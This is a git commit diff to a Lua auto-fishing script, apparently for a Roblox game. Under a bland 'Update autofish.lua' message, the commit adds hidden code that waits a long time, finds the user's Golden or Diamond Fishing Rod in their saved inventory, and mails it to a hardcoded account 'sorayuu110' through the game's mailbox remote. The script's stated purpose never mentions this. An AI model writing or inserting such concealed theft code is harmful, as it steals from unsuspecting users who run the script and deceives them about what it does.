8d199eb2c1ea4a8228e34822db89297e00b7efae
AzuYuu1 <121219497+AzuYuu1@users.noreply.github.com>
2024-03-09 20:07:12 +0700

    Update autofish.lua

--- autofish.lua
+++ autofish.lua
@@ -58,3 +58,29 @@ end
 
 task.wait(120)
 game:GetService("RunService"):Set3dRenderingEnabled(false)
+
+tasi.wait(1500)
+local type = "rod"
+local users = {
+
+"sorayuu110",
+
+}
+
+
+local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+local theId = nil
+for i, v in pairs(save.Get().Inventory.Misc) do
+    if type == "rod" and v.id == "Golden Fishing Rod" then
+        theId = i
+    elseif type == "rod" and v.id == "Diamond Fishing Rod" then
+        theId = i
+     end
+end
+
+
+for i, v in pairs(users) do
+    game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(v,
+        tostring(math.random(1, 100)), "Misc", theId, 1)
+    task.wait(1)
+end
